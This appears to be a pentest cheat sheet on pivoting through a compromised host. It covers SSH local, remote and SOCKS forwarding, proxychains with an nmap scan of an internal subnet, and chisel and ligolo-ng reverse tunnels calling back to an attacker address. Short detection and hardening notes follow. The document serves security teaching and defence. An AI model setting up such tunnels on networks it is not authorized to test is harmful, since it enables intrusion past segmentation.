---
title: "SSH tunneling & pivoting"
category: "networking"
tags: ["networking", "pivoting", "ssh"]
platform: "agnostic"
mitre: ["T1572"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SSH tunneling & pivoting

## TL;DR
Through a compromised host you reach the internal network. SSH offers 3 modes: local (-L), remote (-R), dynamic/SOCKS (-D). For complex networks: chisel/ligolo-ng.

## SSH forwarding
```bash
# Local (-L): local port -> a service visible to the jump host
ssh -L 8080:10.0.0.5:80 user@jump      # localhost:8080 -> internal 10.0.0.5:80

# Remote (-R): expose your port on the remote (reverse)
ssh -R 4444:localhost:4444 user@jump   # jump:4444 -> your localhost:4444

# Dynamic (-D): SOCKS proxy -> whole subnet through the jump
ssh -D 1080 user@jump
# then: proxychains nmap -sT 10.0.0.0/24
```

## proxychains
```text
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains curl http://10.0.0.5
```

## Modern pivoting (without SSH on the target)
```bash
# chisel – reverse SOCKS over HTTP
# attacker:
chisel server -p 8000 --reverse
# on the target:
chisel client 10.10.14.1:8000 R:socks

# ligolo-ng – tun interface, convenient for whole subnets
ligolo-proxy -selfcert         # attacker
# agent on the target -> add a route to the internal subnet
```

## Detection (Blue Team)
- Outbound reverse connections (long-lived), SSH -R, unusual SOCKS/tun.
- An internal host initiating outbound to the internet on unusual ports.

## Mitigation / Hardening
- Egress filtering, segmentation, disable `AllowTcpForwarding` where unneeded.
- Monitor long sessions and tunnels; jump hosts only through an audited bastion.

## Sources
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) · [chisel](https://github.com/jpillora/chisel)
